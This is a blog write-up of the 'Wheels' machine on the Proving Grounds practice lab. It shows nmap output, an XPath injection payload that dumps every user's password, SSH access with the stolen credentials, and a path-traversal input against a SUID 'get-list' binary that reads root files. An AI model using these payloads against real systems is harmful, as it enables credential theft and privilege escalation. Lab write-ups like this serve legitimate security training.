<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Wheels - OSPG | Infomation Security - Blog</title><meta name="description" content="SummaryThe registration mechanism of the website allowed the tester to sign up as a company employee. Landing on the employee portal, the tester discovered a...
    "><meta http-equiv="cache-control" content="max-age=29030400"><meta http-equiv="pragma" content="public"><meta name="keywords" content=""><meta name="author" content="Jay Nguyen"><meta http-equiv="Content-Language" content="en"><meta property="og:locale" content="en"><meta property="og:site_name" content="Infomation Security"><meta property="og:type" content="WebSite"><meta property="og:url" content="https://jayngng.github.io/blog/wheels-ospg/"><meta property="og:description" content="
    Blog"><meta property="og:title" content="Wheels - OSPG
  "><link rel="canonical" href="https://jayngng.github.io/blog/wheels-ospg/"><link type="application/atom+xml" rel="alternate" title="Infomation Security" href="https://jayngng.github.io/feed.xml"><link rel="icon" type="image/png" sizes="32x32" href="https://jayngng.github.io/assets/images/favicon/favicon-32x32.png"><link href="https://fonts.googleapis.com/css?family=Special+Elite" rel="stylesheet"><script defer="defer" src="https://use.fontawesome.com/releases/v5.0.6/js/all.js"></script><link rel="stylesheet" href="https://jayngng.github.io/assets/css/bootstrap.css"><link rel="stylesheet" href="https://jayngng.github.io/assets/css/jektify.css"><link rel="stylesheet" href="https://jayngng.github.io/assets/css/whiteglass.css"></head><body class="body underline_links" id="top"><div class="container layout_default"><div class="row"><div class="col-lg-3 px-0 mt-0 sidebar"><div class="py-3 sticky-top flex-grow-1"><div class="pt-3 sidebar__wrapper"><div class="nav flex-lg-column mx-3 mx-lg-0"><div class="d-none d-sm-block sidebar__avatar_flip"><div class="sidebar__avatar_flip-card"><a class="sidebar__avatar_flip-front sidebar__avatar_flip-face" href="https://jayngng.github.io/"><img class="p-1 img-fluid mx-auto d-block animation__pulse sidebar_avatar_circle sidebar_avatar_background sidebar_avatar_border image_avatar" src="/assets/images/avatar/author.jpg" alt="Avatar"> </a><a class="sidebar__avatar_flip-back sidebar__avatar_flip-face" href="https://jayngng.github.io/"><img class="p-1 img-fluid mx-auto d-block animation__pulse sidebar_avatar_circle sidebar_avatar_background sidebar_avatar_border image_avatar" src="/assets/images/avatar/athor_m.png" alt="Avatar"></a></div></div><h1 class="p-2 text-center d-md-flex align-items-center mx-auto animation__sidebar-title sidebar__title"><a href="https://jayngng.github.io/" class="nav-link" style="font-size: 2.3rem">whoami</a></h1><div class="p-2 mx-3 d-md-flex flex-md-column align-items-md-start align-items-center align-items-lg-start flex-lg-column mx-auto mr-lg-3 ml-lg-3 sidebar__menu animation__sidebar-menu"><div class="my-1 d-none d-md-block mr-3 sidebar__menu-title">Menu: Blog</div><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-edit"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/">Blog</a></li><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-tags"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/tags/">Tags</a></li><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-search"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/search/">Search</a></li></div></div></div></div></div><div class="col-lg-9 p-0 py-4 content" id="main"><div class="px-3 mt-lg-0 layout_post animation__content" itemscope itemtype="http://schema.org/BlogPosting"><div class="p-0 p-lg-3 mb-4 layout_post__header"><h1 class="font-weight-bold layout_post__title">Wheels - OSPG</h1><div class="layout_post__date"><time class="layout_post__time"><i class="far fa-calendar-alt"></i> August 17, 2023</time></div><div class="layout_post__tags"><i class="fa fa-tags"></i>&nbsp;Tags:&nbsp; | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//ospg">ospg</a> | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//red">red</a> | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//linux">linux</a> |</div><div class="layout_post__reading_time"><i class="far fa-clock"></i> Read this in "about 4 minutes".</div></div><div class="p-0 p-lg-3 mb-4 layout_post__content"><div class="d-block"><div class="py-3 row"><div class="offset-6 col-6 offset-sm-9 col-sm-3 offset-lg-10 col-lg-2"></div></div><h1 id="summary">Summary</h1><p>The <code class="language-plaintext highlighter-rouge">registration</code> mechanism of the website allowed the tester to sign up as a company employee. Landing on the employee portal, the tester discovered a <code class="language-plaintext highlighter-rouge">XPATH</code> injection vulnerability in the <code class="language-plaintext highlighter-rouge">search</code> tool. Successful exploitation of this weakness will infiltrate sensitive information of numerous users. Amongst them, <code class="language-plaintext highlighter-rouge">bob</code>’s account granted the tester access into the system via the <code class="language-plaintext highlighter-rouge">ssh</code> service. Privilege escalation is done by exploiting a custom <code class="language-plaintext highlighter-rouge">SUID</code> binary, named <code class="language-plaintext highlighter-rouge">get-list</code>, letting one to arbitrarily read any system files.</p><h1 id="enumeration"><strong>Enumeration</strong></h1><h2 id="nmap"><strong>Nmap</strong></h2><p>The tester scanned target system using <code class="language-plaintext highlighter-rouge">nmap</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$sudo</span> nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-oN</span> evidences/scans/nmap/basic_scan.md <span class="nt">-vv</span> 192.168.167.202
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
<span class="o">[</span>...SNIP...]
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Wheels - Car Repair Services
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div><p>The outputs highlighted the HTTP (port <code class="language-plaintext highlighter-rouge">80</code>) and SSH (port <code class="language-plaintext highlighter-rouge">22</code>). Let’s us initially look at HTTP service listening on port <code class="language-plaintext highlighter-rouge">80</code>.</p><h2 id="http"><strong>HTTP</strong></h2><h3 id="spoofed-employee-account"><strong>Spoofed Employee Account</strong></h3><p>In the <code class="language-plaintext highlighter-rouge">/register.php</code> page, the tester started signing up an account using <code class="language-plaintext highlighter-rouge">Burp Suite</code>. It is worth to notice that the company’s email domain is <code class="language-plaintext highlighter-rouge">@wheels.service</code>.</p><div class="row imager__plugin"><img class="img-fluid mx-auto d-block" src="/assets/images/posts/wheels/1.png" title="wheels/1.png" alt="wheels/1.png"></div><p>The response was successful. In other words, anyone can become an employee. The tester proceeded to login with the registered account and successfully landed on the restricted <code class="language-plaintext highlighter-rouge">portal</code>.</p><div class="row imager__plugin"><img class="img-fluid mx-auto d-block" src="/assets/images/posts/wheels/2.png" title="wheels/2.png" alt="wheels/2.png"></div><p>The <code class="language-plaintext highlighter-rouge">Search</code> users by services can be manipulated from the <code class="language-plaintext highlighter-rouge">url</code>, via <code class="language-plaintext highlighter-rouge">work</code> parameter. Referring to the following example, the tester tried to pull information of all employees by submitting a <code class="language-plaintext highlighter-rouge">blank</code> input.</p><div class="row imager__plugin"><img class="img-fluid mx-auto d-block" src="/assets/images/posts/wheels/3.png" title="wheels/3.png" alt="wheels/3.png"></div><p>Furthermore, attention that an error prompted: <code class="language-plaintext highlighter-rouge">XML Error; No entity found</code> regardless. Further examining with different inputs revealing that a single quote (<code class="language-plaintext highlighter-rouge">'</code>) would render an invalid <code class="language-plaintext highlighter-rouge">xpath()</code> query.</p><div class="row imager__plugin"><img class="img-fluid mx-auto d-block" src="/assets/images/posts/wheels/4.png" title="wheels/4.png" alt="wheels/4.png"></div><p><br></p><h3 id="xpath-injection-attack"><strong>XPath Injection Attack</strong></h3><p>Moving on, the tester carried out different xpath payloads. It is kind of a blind attack since we weren’t sure how the vulnerable codes look like.</p><p>The server codes might look like the following (<code class="language-plaintext highlighter-rouge">HackTricks</code>):</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/user/username[contains<span class="o">(</span>., <span class="s1">'+VALUE+'</span><span class="o">)]</span>
</code></pre></div></div><p>And if our input looks like below:</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">')] | //user/*[1] | a[('</span>
</code></pre></div></div><p>When the code was fed into the server, it will eventually became (like <code class="language-plaintext highlighter-rouge">SQL injection</code>):</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/user/username[contains<span class="o">(</span>., <span class="s1">''</span><span class="o">)]</span> | //user/<span class="k">*</span><span class="o">[</span>1] | a[<span class="o">(</span><span class="s1">''</span><span class="o">)]</span>
</code></pre></div></div><p>With that in mind, we don’t know yet whether the root node is <code class="language-plaintext highlighter-rouge">//user</code>. We can brute force it, but we can also use wildcard (<code class="language-plaintext highlighter-rouge">*</code>) to mine all information from the root node.</p><p>The final payload is as the follow:</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">')] | //* | a[('</span>
</code></pre></div></div><div class="row imager__plugin"><img class="img-fluid mx-auto d-block" src="/assets/images/posts/wheels/5.png" title="wheels/5.png" alt="wheels/5.png"></div><p>From the above photo, the tester had successfully obtained information of all users, including their passwords.</p><h1 id="initial-access"><strong>Initial Access</strong></h1><h2 id="ssh"><strong>SSH</strong></h2><p>Amongst the acquired credentials, <code class="language-plaintext highlighter-rouge">bob</code> user yielded a successful <code class="language-plaintext highlighter-rouge">ssh</code> login attempt. From there, the tester <code class="language-plaintext highlighter-rouge">ssh</code>ed into the target system under <code class="language-plaintext highlighter-rouge">bob</code> permission.</p><p>Local enumeration revealed a few interesting informations, such as databases and configurations. Noticeably, there existed a misconfigured <code class="language-plaintext highlighter-rouge">SUID</code> binary, named <code class="language-plaintext highlighter-rouge">get-list</code>, which gave one permission to arbitrarily read any files in the system if exploited successfully.</p><p>Using the <code class="language-plaintext highlighter-rouge">strings</code> tool to have an overview over the binary, we found that:</p><ul><li>The binary is trying to use the <code class="language-plaintext highlighter-rouge">cat</code> command to read files.</li><li>It needs the present of the <code class="language-plaintext highlighter-rouge">customers</code> or <code class="language-plaintext highlighter-rouge">employees</code> in the input (found that through experiment).</li><li><code class="language-plaintext highlighter-rouge">&amp;</code> and <code class="language-plaintext highlighter-rouge">|</code> and <code class="language-plaintext highlighter-rouge">;</code> are ignored</li></ul><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>tester㉿kali<span class="o">)</span>-[~/Documents/ospg/machines/wheels]                    
└─<span class="nv">$ </span>strings get-list                                

<span class="o">[</span>...SNIP...]

Which List <span class="k">do </span>you want to open? <span class="o">[</span>customers/employees]: 
customers
employees
Opening File....
/bin/cat /root/details/%s
/dev/null
Oops something went wrong!!
</code></pre></div></div><p>When we submit a value, the program will feed our input into the following command:</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/cat /root/details/&lt;input&gt;
</code></pre></div></div><p>Assuming our input is: <code class="language-plaintext highlighter-rouge">../proof.txt #customers</code>. The program will run:</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/cat /root/details/../proof.txt <span class="c">#customers </span>
&lt;<span class="o">!</span><span class="nt">--</span> This is a valid <span class="nb">command </span>and can bypass security check. <span class="nt">--</span><span class="o">!&gt;</span>
</code></pre></div></div><p>A successful exploit returned the <code class="language-plaintext highlighter-rouge">root</code> flag. Yet, we can essentially read any file systems.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bob@wheels:/opt<span class="nv">$ </span>./get-list 


Which List <span class="k">do </span>you want to open? <span class="o">[</span>customers/employees]: ../proof.txt <span class="c">#customers</span>
Opening File....

789bbd990a3af182f511f18b80861ce8
</code></pre></div></div><center><script src="https://tryhackme.com/badge/44696"></script></center></div></div><div class="p-0 p-lg-3 mb-4 layout_post__footer"></div></div></div></div></div><div class="py-1 position-fixed fixed-bottom w-100 footer"><div class="container-fluid"><div class="row"><div class="text-center col-12 col-md-4"><span class="footer__copyright">Infomation Security © 2021-2023 • All right reserved.</span></div><div class="text-center col-12 col-md-4 d-none d-md-block"><span class="footer__message">Simplicity is fashionable.</span></div><div class="text-center col-12 col-md-4"><span class="footer__madeby">Made with&nbsp;<a href="https://jekyllrb.com" target="_blank">Jekyll</a>&nbsp;using&nbsp;<a href="https://github.com/williamcanin/typing-jekyll-template" target="_blank">Typing</a>&nbsp;Theme.</span></div></div></div></div><div class="d-block d-lg-none position-fixed fixed-bottom w-100 scrolltop"><div class="float-right mr-3 scrolltop__wrapper"><a class="mr-3 scrolltop__button" href="#top"><i class="fas fa-caret-up"></i></a></div></div><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/jquery.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/popper.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/bootstrap.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/simple-jekyll-search.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/js/global.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/js/post.js"></script><script src="https://jayngng.github.io/assets/vendor/jektify/js/jektify.min.js"></script></body><script id="dsq-count-scr" src="https://.disqus.com/count.js" async></script></html>